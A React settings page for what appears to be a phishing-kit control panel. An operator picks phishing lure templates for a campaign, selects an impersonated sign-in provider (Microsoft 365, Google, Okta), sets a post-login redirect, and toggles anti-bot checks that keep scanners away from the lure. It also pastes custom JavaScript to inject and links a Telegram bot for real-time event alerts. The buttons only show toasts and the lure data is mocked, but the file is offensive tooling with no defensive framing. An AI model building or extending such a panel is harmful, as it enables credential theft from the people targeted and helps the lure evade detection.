import { useState } from 'react'
import { Cloud, FileText, BarChart, Briefcase, Pen, FileSignature, Folder, Plus, Send, Image as ImageIcon, Eye, EyeOff } from 'lucide-react'
import { MOCK_LURES } from '../lib/mockData'
import { useToast } from '../components/Toast'

const ICONS = { Cloud, FileText, BarChart, Briefcase, Pen, FileSignature, Folder, Plus }

const Toggle = ({ checked, onChange, label }) => (
  <label className="flex items-center justify-between p-3 rounded-xl bg-white/5 border border-white/10 cursor-pointer">
    <span className="text-sm text-white">{label}</span>
    <button onClick={() => onChange(!checked)} className={`relative w-11 h-6 rounded-full transition ${checked ? 'bg-accent' : 'bg-white/10'}`}>
      <span className={`absolute top-0.5 left-0.5 w-5 h-5 rounded-full bg-white transition ${checked ? 'translate-x-5' : ''}`} />
    </button>
  </label>
)

export default function SettingsPage() {
  const toast = useToast()
  const [selected, setSelected] = useState(1)
  const [provider, setProvider] = useState('m365')
  const [redirect, setRedirect] = useState('')
  const [bgImage, setBgImage] = useState(null)
  const [script, setScript] = useState('')
  const [antiCloud, setAntiCloud] = useState(true)
  const [antiRecap, setAntiRecap] = useState(false)
  const [antiHcaptcha, setAntiHcaptcha] = useState(false)
  const [telegramChat, setTelegramChat] = useState('')
  const [telegramBot, setTelegramBot] = useState('')
  const [showBot, setShowBot] = useState(false)

  return (
    <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
      <div className="xl:col-span-2 glass rounded-2xl p-6 border border-white/10">
        <h2 className="text-xl font-semibold text-white mb-1">Lure Templates</h2>
        <p className="text-sm text-gray-400 mb-5">Pick a phishing template for your campaign.</p>
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 mb-6">
          {MOCK_LURES.map((l) => {
            const Icon = ICONS[l.icon] || FileText
            const sel = selected === l.id
            return (
              <button key={l.id} onClick={() => setSelected(l.id)}
                className={`p-4 rounded-2xl text-left transition border ${sel ? 'bg-accent/10 border-accent/50 shadow-glow' : 'bg-white/5 border-white/10 hover:bg-white/10'}`}>
                <div className="w-11 h-11 rounded-xl flex items-center justify-center mb-3"
                  style={{ background: `${l.color}25`, color: l.color }}>
                  <Icon size={22} />
                </div>
                <div className="text-sm font-semibold text-white">{l.name}</div>
                <div className="text-[11px] text-gray-400 mt-1 line-clamp-2">{l.description}</div>
              </button>
            )
          })}
        </div>
        <h3 className="text-lg font-semibold text-white mb-3">Service Provider</h3>
        <div className="flex gap-2 mb-6">
          {[
            { id: 'm365', label: 'Microsoft 365' }, { id: 'google', label: 'Google' },
            { id: 'okta', label: 'Okta' }, { id: 'custom', label: 'Custom' }
          ].map((p) => (
            <label key={p.id} className={`flex-1 px-4 py-3 rounded-xl border text-center cursor-pointer transition ${provider === p.id ? 'bg-accent/15 border-accent/50 text-accent' : 'bg-white/5 border-white/10 text-gray-300'}`}>
              <input type="radio" name="prov" value={p.id} checked={provider === p.id} onChange={() => setProvider(p.id)} className="hidden" />
              {p.label}
            </label>
          ))}
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
          <div>
            <label className="block text-xs text-gray-400 mb-1">Redirect URL (after auth)</label>
            <input value={redirect} onChange={(e) => setRedirect(e.target.value)} placeholder="https://your-domain.com/landing" />
          </div>
          <div>
            <label className="block text-xs text-gray-400 mb-1">Background Image</label>
            <label className="flex items-center gap-2 px-3 py-2.5 rounded-xl border border-white/10 bg-white/5 cursor-pointer hover:bg-white/10">
              <ImageIcon size={16} className="text-gray-400" />
              <span className="text-sm text-gray-300 flex-1 truncate">{bgImage || 'Click to upload'}</span>
              <input type="file" accept="image/*" className="hidden" onChange={(e) => setBgImage(e.target.files[0]?.name)} />
            </label>
          </div>
        </div>
        <h3 className="text-lg font-semibold text-white mb-3 mt-6">Anti-Bot Detection</h3>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mb-4">
          <Toggle checked={antiCloud} onChange={setAntiCloud} label="Cloudflare Turnstile" />
          <Toggle checked={antiRecap} onChange={setAntiRecap} label="Google reCAPTCHA" />
          <Toggle checked={antiHcaptcha} onChange={setAntiHcaptcha} label="hCaptcha" />
        </div>
        <h3 className="text-lg font-semibold text-white mb-2 mt-6">Custom Logs / Scripts</h3>
        <textarea value={script} onChange={(e) => setScript(e.target.value)} rows={5}
          placeholder="// Paste custom JS to inject..." className="w-full font-mono text-xs" />
        <button onClick={() => toast.success('Settings saved')}
          className="mt-6 px-6 py-2.5 rounded-xl bg-gradient-to-r from-accent to-purple text-white font-medium shadow-glow">
          Save Settings
        </button>
      </div>
      <aside className="glass rounded-2xl p-6 border border-white/10 h-fit">
        <h3 className="text-lg font-semibold text-white mb-1 flex items-center gap-2">
          <Send size={18} className="text-accent" />Telegram Notifications
        </h3>
        <p className="text-sm text-gray-400 mb-5">Send real-time events to your Telegram bot.</p>
        <label className="block text-xs text-gray-400 mb-1">Chat ID</label>
        <input value={telegramChat} onChange={(e) => setTelegramChat(e.target.value)} placeholder="-100123456789" className="w-full mb-4" />
        <label className="block text-xs text-gray-400 mb-1">Bot Token</label>
        <div className="relative mb-4">
          <input type={showBot ? 'text' : 'password'} value={telegramBot} onChange={(e) => setTelegramBot(e.target.value)}
            placeholder="123456:ABC-DEF…" className="w-full pr-10" />
          <button onClick={() => setShowBot(!showBot)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
            {showBot ? <EyeOff size={16} /> : <Eye size={16} />}
          </button>
        </div>
        <button onClick={() => toast.success('Test notification sent')}
          className="w-full py-2.5 rounded-xl bg-accent/15 text-accent hover:bg-accent/25 border border-accent/30 mb-2 text-sm">
          Send Test Notification
        </button>
        <button onClick={() => toast.success('Settings saved')}
          className="w-full py-2.5 rounded-xl bg-gradient-to-r from-accent to-purple text-white shadow-glow text-sm font-medium">
          Save Telegram
        </button>
      </aside>
    </div>
  )
}
